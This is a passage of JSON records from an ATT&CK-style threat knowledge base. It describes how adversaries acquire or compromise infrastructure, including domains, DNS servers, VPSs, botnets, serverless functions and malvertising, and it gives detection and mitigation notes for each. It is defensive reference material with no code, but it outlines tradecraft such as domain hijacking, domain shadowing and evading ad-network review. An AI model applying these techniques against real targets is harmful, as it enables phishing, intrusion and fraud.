rel=\"noopener\" class=\"citation\">(Citation: httrack_unhcr)</a> <a href=\"https://web.archive.org/web/20171223000420/https://www.riskiq.com/blog/labs/lazarus-group-cryptocurrency/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: lazgroup_idn_phishing)</a>\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names). <a href=\"https://docs.ostorlab.co/kb/IPA_URL_SCHEME_HIJACKING/index.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: iOS URL Scheme)</a> <a href=\"https://www.techtarget.com/searchsecurity/tip/Preparing-for-uniform-resource-identifier-URI-exploits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: URI)</a> <a href=\"https://www.blackhat.com/presentations/bh-dc-08/McFeters-Rios-Carter/Presentation/bh-dc-08-mcfeters-rios-carter.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: URI Use)</a> <a href=\"https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: URI Unique)</a>\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history. <a href=\"https://www.mdsec.co.uk/2017/07/categorisation-is-not-a-security-boundary/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Categorisation_not_boundary)</a> <a href=\"https://krebsonsecurity.com/2018/11/that-domain-you-forgot-to-renew-yeah-its-now-stealing-credit-cards/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Domain_Steal_CC)</a> <a href=\"https://www.cobaltstrike.com/blog/high-reputation-redirectors-and-domain-fronting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Redirectors_Domain_Fronting)</a> <a href=\"https://www.blackhillsinfosec.com/bypass-web-proxy-filtering/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: bypass_webproxy_filtering)</a>\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT1)</a>\n\nIn addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing. <a href=\"https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Invictus IR DangerDev 2024)</a>","detection":"Domain registration information is, by design, captured in public registration logs. Consider use of services that may aid in tracking of newly acquired domains, such as WHOIS databases and/or passive DNS. In some cases it may be possible to pivot on known pieces of domain registration information to uncover other infrastructure purchased by the adversary. Consider monitoring for domains created with a similar structure to your own, including under a different TLD. Though various tools and services exist to track, query, and monitor domain name registration information, tracking across multiple DNS infrastructures can require multiple tools/services or more advanced analytics. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a>\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control.","platforms":["PRE"],"dataSources":["Domain Name: Passive DNS","Domain Name: Domain Registration","Domain Name: Active DNS"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"Organizations may intentionally register similar domains to their own to deter adversaries from creating typosquatting domains. Other facets of this technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1583.002","name":"DNS Server","description":"Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (DNS). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel. <a href=\"https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 DNS Mar 2019)</a>","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1583.003","name":"Virtual Private Server","description":"Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure. <a href=\"https://documents.trendmicro.com/assets/wp/wp-criminal-hideouts-for-lease.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendmicroHideoutsLease)</a>","detection":"Once adversaries have provisioned a VPS (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a> <a href=\"https://www.mandiant.com/resources/scandalous-external-detection-using-network-scan-data-and-automation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant SCANdalous Jul 2020)</a> <a href=\"https://michaelkoczwara.medium.com/cobalt-strike-c2-hunting-with-shodan-c448d501a6e2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Koczwara Beacon Hunting Sep 2021)</a>\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content","Internet Scan: Response Metadata"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1583.004","name":"Server","description":"Adversaries may buy, lease, rent, or obtain physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in Drive-by Compromise, enabling Phishing operations, or facilitating Command and Control. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused. <a href=\"https://unit42.paloaltonetworks.com/purpleurchin-steals-cloud-resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Free Trial PurpleUrchin)</a> <a href=\"https://sysdig.com/blog/googles-vertex-ai-platform-freejacked/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Freejacked)</a> \n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems. <a href=\"https://www.nytimes.com/2011/01/16/world/middleeast/16stuxnet.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NYTStuxnet)</a>","detection":"Once adversaries have provisioned a server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a> <a href=\"https://www.mandiant.com/resources/scandalous-external-detection-using-network-scan-data-and-automation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant SCANdalous Jul 2020)</a> <a href=\"https://michaelkoczwara.medium.com/cobalt-strike-c2-hunting-with-shodan-c448d501a6e2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Koczwara Beacon Hunting Sep 2021)</a>\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":["PRE"],"dataSources":["Internet Scan: Response Metadata","Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1583.005","name":"Botnet","description":"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. <a href=\"https://us.norton.com/internetsecurity-malware-what-is-a-botnet.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Norton Botnet)</a> Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. \n\nInternet-facing edge devices and related network appliances that are end-of-life (EOL) and unsupported by their manufacturers are commonly acquired for botnet activities. Adversaries may lease operational relay box (ORB) networks – consisting of virtual private servers (VPS), small office/home office (SOHO) routers, or Internet of Things (IoT) devices – to serve as a botnet. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ORB Mandiant)</a> \n\nWith a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS). <a href=\"https://www.imperva.com/learn/ddos/booters-stressers-ddosers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Imperva DDoS for Hire)</a> <a href=\"https://krebsonsecurity.com/2017/01/who-is-anna-senpai-the-mirai-worm-author/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Krebs-Anna)</a> <a href=\"https://krebsonsecurity.com/2016/10/hackforums-shutters-booter-service-bazaar/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Krebs-Bazaar)</a> <a href=\"https://krebsonsecurity.com/2016/10/are-the-days-of-booter-services-numbered/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Krebs-Booter)</a> Acquired botnets may also be used to support Command and Control activity, such as Hide Infrastructure through an established Proxy network.","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Phishing, Endpoint Denial of Service, or Network Denial of Service.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1583.006","name":"Web Services","description":"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries to hide in expected noise. <a href=\"https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye APT29)</a> <a href=\"https://thehackernews.com/expert-insights/2024/05/github-abuse-flaw-shows-why-we-cant.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hacker News GitHub Abuse 2024)</a> By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.","detection":"Once adversaries leverage the web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a>\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control (Web Service) or Exfiltration Over Web Service.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1583.007","name":"Serverless","description":"Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. <a href=\"https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackWater Malware Cloudflare Workers)</a> <a href=\"https://blog.xpnsec.com/aws-lambda-redirector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Lambda Redirector)</a> <a href=\"https://www.bleepingcomputer.com/news/security/hackers-abuse-google-apps-script-to-steal-credit-cards-bypass-csp/#google_vignette\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GWS Apps Script Abuse 2021)</a> As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to Hide Infrastructure. (Citation: Detecting Command &amp; Control in the Cloud) <a href=\"https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackWater Malware Cloudflare Workers)</a>","detection":"","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1583.008","name":"Malvertising","description":"Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements. <a href=\"https://www.spamhaus.com/resource-center/a-surge-of-malvertising-across-google-ads-is-distributing-dangerous-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: spamhaus-malvertising)</a> Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software. <a href=\"https://labs.guard.io/masquerads-googles-ad-words-massively-abused-by-threat-actors-targeting-organizations-gpus-42ae73ee8a1e\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Masquerads-Guardio)</a> <a href=\"https://www.ic3.gov/Media/Y2022/PSA221221\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FBI-search)</a> Adversary’s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts. <a href=\"https://www.sentinelone.com/blog/breaking-down-the-seo-poisoning-attack-how-attackers-are-hijacking-search-results/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinelone-malvertising)</a> \n\nMalvertising may be used to support Drive-by Target and Drive-by Compromise, potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser. <a href=\"https://www.bbc.com/news/technology-12891182\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BBC-malvertising)</a>\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement. <a href=\"https://labs.guard.io/masquerads-googles-ad-words-massively-abused-by-threat-actors-targeting-organizations-gpus-42ae73ee8a1e\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Masquerads-Guardio)</a> Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection. <a href=\"https://www.spamhaus.com/resource-center/a-surge-of-malvertising-across-google-ads-is-distributing-dangerous-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: spamhaus-malvertising)</a>","detection":"","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should be focused on initial access activities, such as drive by compromise where ad blocking adblockers can help prevent malicious code from executing."}]}]},{"id":"T1584","name":"Compromise Infrastructure","description":"Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT1)</a> <a href=\"https://www.icann.org/groups/ssac/documents/sac-007-en\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ICANNDomainNameHijacking)</a> <a href=\"https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos DNSpionage Nov 2018)</a> <a href=\"https://web.archive.org/web/20151226205946/https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye EPS Awakens Part 2)</a> Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with Digital Certificates) to further blend in and support staged information gathering and/or Phishing campaigns. <a href=\"https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye DNS Hijack 2019)</a> Adversaries may also compromise numerous machines to support Proxy and/or proxyware services or to form a botnet. <a href=\"https://www.amnesty.org/en/latest/research/2021/07/forensic-methodology-report-how-to-catch-nso-groups-pegasus/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: amnesty_nso_pegasus)</a> <a href=\"https://sysdig.com/blog/proxyjacking-attackers-log4j-exploited/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysdig Proxyjacking)</a> Additionally, adversaries may compromise infrastructure residing in close proximity to a target in order to gain Initial Access via Wi-Fi Networks. <a href=\"https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nearest Neighbor Volexity)</a>\n\nBy using compromised infrastructure, adversaries may enable follow-on malicious operations. Prior to targeting, adversaries may also compromise the infrastructure of other adversaries. <a href=\"https://media.defense.gov/2019/Oct/18/2002197242/-1/-1/0/NSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA NCSC Turla OilRig)</a>","detection":"Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet. \n\nOnce adversaries have provisioned compromised infrastructure (ex: a server for use in command and control), internet scans may help proactively discover compromised infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a> <a href=\"https://www.mandiant.com/resources/scandalous-external-detection-using-network-scan-data-and-automation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant SCANdalous Jul 2020)</a> <a href=\"https://michaelkoczwara.medium.com/cobalt-strike-c2-hunting-with-shodan-c448d501a6e2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Koczwara Beacon Hunting Sep 2021)</a>\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content","Domain Name: Domain Registration","Domain Name: Active DNS","Domain Name: Passive DNS","Internet Scan: Response Metadata"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}],"subTechniques":[{"id":"T1584.001","name":"Domains","description":"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant. <a href=\"https://www.icann.org/groups/ssac/documents/sac-007-en\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ICANNDomainNameHijacking)</a> Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53). <a href=\"https://krebsonsecurity.com/2019/02/a-deep-dive-on-the-recent-widespread-dns-hijacking-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Krebs DNS Hijack 2019)</a>\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain. <a href=\"https://docs.microsoft.com/en-us/azure/security/fundamentals/subdomain-takeover\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Sub Takeover 2020)</a>\n\nAdversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time. <a href=\"https://unit42.paloaltonetworks.com/domain-shadowing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Unit 42 Domain Shadowing 2022)</a>","detection":"Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":["PRE"],"dataSources":["Domain Name: Passive DNS","Domain Name: Domain Registration","Domain Name: Active DNS"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1584.002","name":"DNS Server","description":"Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary. <a href=\"https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos DNSpionage Nov 2018)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye DNS Hijack 2019)</a>  Additionally, adversaries may leverage such control in conjunction with Digital Certificates to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications. <a href=\"https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye DNS Hijack 2019)</a> <a href=\"https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targets-multiple-sectors/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike DNS Hijack 2019)</a> Alternatively, they may be able to prove ownership of a domain to a SaaS service in order to assert control of the service or create a new administrative Cloud Account. <a href=\"https://cybercx.com.au/blog/keys-to-the-saas-kingdom/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CyberCX SaaS Domain Hijacking 2025)</a> Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server. <a href=\"https://blogs.cisco.com/security/talos/angler-domain-shadowing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CiscoAngler)</a> <a href=\"https://www.proofpoint.com/us/threat-insight/post/The-Shadow-Knows\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint Domain Shadowing)</a>","detection":"Consider monitoring for anomalous resolution changes for domain addresses. Efforts may need to be tailored to specific domains of interest as benign resolution changes are a common occurrence on the internet.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":["PRE"],"dataSources":["Domain Name: Active DNS","Domain Name: Passive DNS"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1584.003","name":"Virtual Private Server","description":"Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves. <a href=\"https://media.defense.gov/2019/Oct/18/2002197242/-1/-1/0/NSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA NCSC Turla OilRig)</a>\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.","detection":"Once adversaries have provisioned software on a compromised VPS (ex: for use as a command and control server), internet scans may reveal VPSs that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a> <a href=\"https://www.mandiant.com/resources/scandalous-external-detection-using-network-scan-data-and-automation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant SCANdalous Jul 2020)</a> <a href=\"https://michaelkoczwara.medium.com/cobalt-strike-c2-hunting-with-shodan-c448d501a6e2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Koczwara Beacon Hunting Sep 2021)</a>\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content","Internet Scan: Response Metadata"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1584.004","name":"Server","description":"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. <a href=\"https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro EarthLusca 2022)</a> Instead of purchasing a Server or Virtual Private Server, adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in Drive-by Compromise, or email servers to support Phishing operations.","detection":"Once adversaries have provisioned software on a compromised server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a> <a href=\"https://www.mandiant.com/resources/scandalous-external-detection-using-network-scan-data-and-automation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant SCANdalous Jul 2020)</a> <a href=\"https://michaelkoczwara.medium.com/cobalt-strike-c2-hunting-with-shodan-c448d501a6e2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Koczwara Beacon Hunting Sep 2021)</a>\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":["PRE"],"dataSources":["Internet Scan: Response 